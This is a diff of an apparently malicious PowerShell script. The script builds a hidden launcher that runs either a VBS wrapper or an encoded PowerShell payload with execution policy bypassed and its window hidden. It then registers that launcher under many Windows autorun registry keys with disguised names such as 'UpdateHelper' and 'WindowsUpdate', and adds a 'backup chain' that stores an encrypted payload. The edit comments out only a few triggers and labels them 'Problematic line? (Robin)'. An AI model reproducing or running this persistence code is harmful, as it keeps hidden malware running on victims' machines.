@@ -58,10 +58,10 @@ Set-Content $x $vbs -Encoding ASCII -Force;(gi $x -Force).Attributes=6;$v=$x;bre
 $c=if($v){"wscript.exe //B //Nologo `"$v`""}else{"powershell.exe -Exec Bypass -Window Hidden -Enc $eL1"}
 
 # HKCU Triggers
-Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c
+# Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c  <-- Problematic line? (Robin)
 Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateHelper" $c
 Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "TempCleanup" $c
-Set-RegValue "HKCU:\Environment" "windir" $c
+# Set-RegValue "HKCU:\Environment" "windir" $c  <-- Problematic line? (Robin)
 Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsUpdate" $c
 
 # BACKUP CHAIN - Store encrypted payload
@@ -82,8 +82,8 @@ $c2e="wscript.exe //B //Nologo `"$bvp`""
 Write-Host "[BACKUP] VBS wrapper: $bvp" -ForegroundColor Green
 
 # BACKUP CHAIN - Triggers
-Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c2e
-Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" "Startup" $c2e
+# Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" "Load" $c2e  <-- Problematic line? (Robin)
+# Set-RegValue "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" "Startup" $c2e <-- Problematic line? (Robin)
 Set-RegValue "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Configuration" $c2e
 
 Write-Host "[BACKUP] Backup triggers installed" -ForegroundColor Green
